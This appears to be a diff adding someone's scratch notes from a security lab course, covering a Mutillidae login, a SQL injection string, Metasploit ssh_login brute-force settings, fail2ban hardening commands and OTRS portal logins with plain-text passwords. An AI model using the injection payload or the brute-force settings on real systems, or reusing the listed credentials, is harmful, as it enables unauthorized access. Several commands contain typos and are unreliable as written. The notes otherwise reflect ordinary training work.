@@ -1,0 +1,56 @@
+192.168.101.228
+http://192.168.101.228/mutillidae/src/index.php
+username / password : parksojun
+
+SQL QUERY
+SELEC * FROM users WHERE username = 'input' AND password='input';
+
+SQL INJECTION
+'OR'1'='1
+
+https://codeshare.io/5Q1R6x
+
+http://208.8.8.133/
+
+
+search ssh_login
+
+set user_file /home/kali/Desktop/username
+set pass_file /home/kali/Desktop/password
+set stop_on_siccess trueexplou
+set verbose true
+show options
+exploits
+
+
+-----------------------------------------------
+SECURECRT:
+sudo dnf -y install fail2ban
+sudo systemctl enable --now fail2ban
+fail2ban-client status
+fail2ban-client status sshd
+sudo nano /etc/fail2ban/jail.local
+
+[SSHD]
+enabled = true
+port = ssh
+
+sudo systemctl restart fail2ban
+
+
+
+http://soc.rivanit.com/otrs/index.pl
+http://208.8.8.133/otrs/index.pl
+
+admin
+C1sc0123
+
+http://208.8.8.133/otrs/customer.pl
+
+user1
+C1sc0123
+
+
+2026082271000012 
+
+
